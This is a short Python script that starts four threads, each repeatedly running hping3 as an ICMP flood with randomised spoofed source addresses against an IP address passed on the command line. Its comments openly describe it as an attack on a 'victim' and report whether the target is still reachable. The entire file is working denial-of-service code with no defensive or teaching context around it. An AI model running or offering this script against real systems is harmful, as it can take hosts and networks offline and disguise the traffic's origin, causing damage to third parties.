import subprocess
import threading
import time
import signal
import sys

# Boolean to allow the program to run
keep_running = True

# Handles signals from the user to allow program output even after interuption
def signal_handler(sig, frame):
    global keep_running
    print("\nStopping all threads...")
    keep_running = False

# Function to send continuous hping3 requests
def hping3_ping(target):
    while keep_running:
        try:
            # Runs an ICMP flood attack with random packet sources and a 
            # target selected in the command line argument
            result = subprocess.run(
                ["sudo", "hping3", "-1", "--rand-source", "--flood", target],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            # Outputs if the victim can be reached
            if result.returncode == 0:
                print(f"{target} is reachable")
            else:
                print(f"{target} is unreachable: {result.stderr}")
        except FileNotFoundError:
            print("Error: hping3 not installed.")
            break
        time.sleep(1)  # Downtime in between pings 

# Creates multiple threads for the attack
def hping3_multiple_threads(target, thread_count):
    threads = []
    # Starts the threads and the function that they run including arguments
    for _ in range(thread_count):
        thread = threading.Thread(target=hping3_ping, args=(target,))
        threads.append(thread)
        thread.start()

    return threads

if __name__ == "__main__":
    # Allows the user to terminate the attack with Ctrl + C
    # Gives completion time in the console
    signal.signal(signal.SIGINT, signal_handler)

    target = sys.argv[1]  # The IP in the command line argument
    thread_count = 4 # Four threads are used for this script

    print(f"Starting to ping {target} with {thread_count} threads using hping3...")
    start_time = time.time()

    # Start the threads for the attack
    threads = hping3_multiple_threads(target, thread_count)

    # Wait for the threads to finish executing the attack
    for thread in threads:
        thread.join()
    
    # Prints out the completion time of the attack in seconds
    end_time = time.time()
    print(f"Completed in {end_time - start_time} seconds.")
